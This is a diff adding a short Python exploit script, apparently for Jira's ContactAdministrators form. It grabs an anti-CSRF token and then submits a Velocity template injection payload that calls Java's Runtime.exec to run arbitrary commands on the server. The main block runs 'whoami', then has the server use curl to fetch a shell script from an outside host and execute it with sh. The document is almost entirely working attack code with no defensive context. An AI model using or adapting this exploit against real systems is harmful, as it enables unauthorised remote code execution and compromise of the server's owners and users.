@@ -1,0 +1,46 @@
+# -*- coding: utf-8 -*-
+import requests
+
+req = requests.Session()
+
+def Base(url,subject):
+    print("[+] Get Token")
+    r = req.get("%s/secure/ContactAdministrators!default.jspa" % url)
+    c = r.headers['Set-Cookie']
+    t = c[c.find("=")+1:c.find(";")]
+    data = {
+        "from": "test@test.com",
+        "subject": subject,
+        "details": "v",
+        "atl_token": t,
+        "发送": "发送"
+    }
+    print("[+] Token : %s" % t)
+    print("[+] Exploit")
+    r = req.post("%s/secure/ContactAdministrators.jspa" %
+                 url, data=data, allow_redirects=False)
+    # print(r.status_code)
+
+def Exp(url, cmd="whoami"):
+    payload = """
+#set ($cmd="%s")
+#set ($e="exp")
+#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
+#set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
+#set($sc = $e.getClass().forName("java.util.Scanner"))
+#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
+#set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
+#if($scan.hasNext())
+    $scan.next()
+#end
+    """ % cmd
+    Base(url,payload)
+
+def Poc(url):
+    payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()"
+    Base(url,payload)
+
+if __name__ == "__main__":
+    Poc("http://localhost:8080")
+    Exp("http://localhost:8080","curl vpsip/re.sh -o /tmp/re.sh")
+    Exp("http://localhost:8080","sh /tmp/re.sh")
